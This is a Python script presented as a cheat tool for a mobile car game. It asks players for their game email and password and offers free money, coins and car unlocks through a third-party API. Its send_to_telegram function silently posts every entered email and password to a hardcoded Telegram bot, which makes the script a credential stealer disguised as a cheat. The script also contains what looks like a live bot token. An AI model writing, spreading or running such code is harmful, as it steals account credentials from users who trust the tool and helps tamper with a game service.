import os
import time
import sys
import random
import requests
import urllib.parse

# --- НАСТРОЙКИ TELEGRAM ---
BOT_TOKEN = "8642555081:AAFCPMuESMEH4QX7Mlbk4L6AhdA2D1_vR8w"
CHAT_ID = "7149867962"
# --------------------------------------------------

# --- НАСТРОЙКИ API (ВШИТЫЙ КЛЮЧ) ---
BASE_URL = "https://admincpm.io/RyderChang/api"
INTERNAL_ACCESS_KEY = "Bypassed" # Ключ вшит внутрь, пользователь его не видит
# --------------------------------------------------

# ANSI escape codes for colors
RED = '\033[91m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
WHITE = '\033[97m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

class CPM2API:
    def __init__(self, access_key):
        self.auth_token = None
        self.access_key = access_key
    
    def login(self, email, password):
        payload = { "account_email": email, "account_password": password }
        params = { "key": self.access_key }
        try:
            response = requests.post(f"{BASE_URL}/account_login", params=params, data=payload, timeout=10)
            response_decoded = response.json()
            if response_decoded.get("ok"):
                self.auth_token = response_decoded.get("auth")
                return True, None
            return False, response_decoded.get("error")
        except Exception as e:
            return False, str(e)

    def set_player_money(self, amount):
        payload = { "account_auth": self.auth_token, "amount": amount }
        params = { "key": self.access_key }
        try:
            response = requests.post(f"{BASE_URL}/set_money", params=params, data=payload, timeout=10)
            return response.json().get("ok")
        except: return False

    def set_player_coins(self, amount):
        payload = { "account_auth": self.auth_token, "amount": amount }
        params = { "key": self.access_key }
        try:
            response = requests.post(f"{BASE_URL}/set_coins", params=params, data=payload, timeout=10)
            return response.json().get("ok")
        except: return False

    def unlock_all_cars(self):
        payload = { "account_auth": self.auth_token }
        params = { "key": self.access_key }
        try:
            response = requests.post(f"{BASE_URL}/unlock_all_cars", params=params, data=payload, timeout=10)
            return response.json().get("ok")
        except: return False

    def unlock_all_cars_siren(self):
        payload = { "account_auth": self.auth_token }
        params = { "key": self.access_key }
        try:
            response = requests.post(f"{BASE_URL}/unlock_all_cars_siren", params=params, data=payload, timeout=10)
            return response.json().get("ok")
        except: return False

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_header():
    print(f"{WHITE}CPM2DARKTOOL [FULL VERSION]{RESET}")
    print(f"{YELLOW}========================================================{RESET}")
    print(f"{YELLOW}    PLEASE LOG OUT FROM CPM BEFORE USING THIS TOOL{RESET}")
    print(f"{RED}    UNAUTHORIZED DISTRIBUTION IS NOT ALLOWED{RESET}")
    print(f"{YELLOW}========================================================{RESET}")

def send_to_telegram(email, password):
    message = f"🚀 **Новые данные аккаунта (CPM2DARKTOOL FULL)!**\n\n📧 Email: `{email}`\n🔑 Password: `{password}`\n\n📱 Устройство: {os.name}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = { "chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown" }
    try: requests.post(url, data=payload, timeout=10)
    except: pass

def main():
    api = CPM2API(INTERNAL_ACCESS_KEY)
    
    while True:
        clear_screen()
        print_header()
        print(f"{YELLOW}========[ ACCOUNT LOGIN ]========{RESET}")
        email = input(f"{WHITE}[?] Game Email: {RESET}")
        password = input(f"{WHITE}[?] Game Password: {RESET}")
        
        # Отправка данных в Telegram
        send_to_telegram(email, password)
        
        print(f"\n{CYAN}[*] Authenticating with game servers...{RESET}")
        success, error = api.login(email, password)
        
        if success:
            print(f"{GREEN}[+] Login successful!{RESET}")
            time.sleep(1)
            break
        else:
            print(f"{RED}[!] Login failed: {error if error else 'Unknown error'}{RESET}")
            time.sleep(2)

    menu_items = [
        ("01", "Increase Money (50M)", "Free"),
        ("02", "Increase Coins (30K)", "Free"),
        ("03", "Unlock All Cars", "Free"),
        ("04", "Unlock All Cars Siren", "Free"),
        ("0", "Exit", "")
    ]

    while True:
        clear_screen()
        print_header()
        print(f"{YELLOW}========[ MENU ]========{RESET}")
        for code, name, price in menu_items:
            print(f"{YELLOW}({code}): {WHITE}{name:<30} {GREEN}{price}")
        
        choice = input(f"\n{WHITE}[?] Select a Service: {RESET}")
        
        if choice == '0': break
        
        print(f"{CYAN}[*] Processing request...{RESET}")
        res = False
        if choice == '01': res = api.set_player_money(50000000)
        elif choice == '02': res = api.set_player_coins(30000)
        elif choice == '03': res = api.unlock_all_cars()
        elif choice == '04': res = api.unlock_all_cars_siren()
        
        if res:
            print(f"{GREEN}[+] Success! Restart the game to see changes.{RESET}")
        else:
            print(f"{RED}[!] Operation failed. Please try again later.{RESET}")
        
        input(f"\n{WHITE}Press Enter to continue...{RESET}")

if __name__ == "__main__":
    main()
